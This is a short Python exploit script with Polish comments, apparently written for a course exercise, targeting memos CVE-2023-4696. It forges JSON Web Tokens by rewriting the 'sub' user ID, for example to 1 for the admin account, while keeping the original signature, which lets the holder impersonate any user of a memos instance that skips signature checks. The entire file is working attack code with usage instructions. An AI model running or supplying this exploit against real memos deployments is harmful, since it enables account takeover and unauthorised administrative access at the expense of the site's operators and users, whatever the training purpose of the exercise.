#!/usr/bin/env python3
# Zadanie 3.10 - memos CVE-2023-4696 (Improper Access Control)
# memos NIE weryfikuje podpisu JWT -> wystarczy podmienic pole "sub" (ID usera),
# zeby podszyc sie pod dowolnego uzytkownika. Podpis moze byc dowolny/stary.
#
# Uzycie: python3 forge_memos.py <token_hackera> <nowy_sub>
#   np. python3 forge_memos.py eyJ... 1     (udawaj admina 'test')
import sys, base64, json

def dec(x): x += '=' * (-len(x) % 4); return base64.urlsafe_b64decode(x)
def enc(b): return base64.urlsafe_b64encode(b).decode().rstrip('=')

tok = sys.argv[1]
new_sub = sys.argv[2] if len(sys.argv) > 2 else "1"

h, p, s = tok.split(".")
payload = json.loads(dec(p))
payload["sub"] = str(new_sub)          # 1=test(admin), 2=student, 3=hacker
newp = enc(json.dumps(payload, separators=(',', ':')).encode())

# memos ignoruje podpis - zostawiamy stary (s). Dziala tez pusty.
print(f"{h}.{newp}.{s}")
